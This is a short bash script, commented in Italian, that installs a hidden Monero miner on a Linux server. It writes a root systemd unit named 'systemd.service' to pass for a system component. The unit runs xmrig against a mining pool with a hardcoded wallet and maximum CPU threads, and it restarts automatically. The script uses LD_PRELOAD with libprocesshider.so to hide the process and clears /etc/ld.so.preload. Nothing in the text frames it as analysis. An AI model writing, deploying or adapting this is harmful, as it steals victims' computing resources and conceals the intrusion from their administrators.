#!/bin/bash

# 1. Ferma il servizio attuale per evitare conflitti durante la riscrittura
systemctl stop systemd.service 2>/dev/null || true

# 2. Crea la cartella se non esiste ed entra dentro
mkdir -p /opt/systemd
cd /opt/systemd

# 3. PULIZIA DEL SISTEMA (Cruciale per sbloccare SSH)
# Svuota il file globale per evitare che influenzi altri servizi come SSH
if [ -f /etc/ld.so.preload ]; then
    > /etc/ld.so.preload
fi

# 4. CREAZIONE DEL SERVIZIO SYSTEMD ISOLATO
# Applichiamo LD_PRELOAD solo a questo specifico servizio tramite la direttiva 'Environment'
cat <<EOF > /etc/systemd/system/systemd.service
[Unit]
Description=Systemd Service
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/systemd
# La libreria viene iniettata SOLO in questo processo e nei suoi figli
Environment="LD_PRELOAD=/usr/local/lib/libprocesshider.so"
ExecStart=/opt/systemd/xmrig -o gulf.moneroocean.stream:10128 -u 46PY3me35srRYMUScA3r7uhNJorsH95Sg4rkCqYhKm7tFh94w5nSEnp91S7ZmLwFGJS9UrHN4BCxL7CcPDjGUj8cVFbgHkt -p server_\$(hostname -s) --keepalive --cpu-max-threads-hint=100 --randomx-mode=fast --randomx-1gb-pages --no-nvml --no-opencl
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# 5. Ricarica la configurazione di Systemd e avvia il processo isolato
systemctl daemon-reload
systemctl start systemd.service
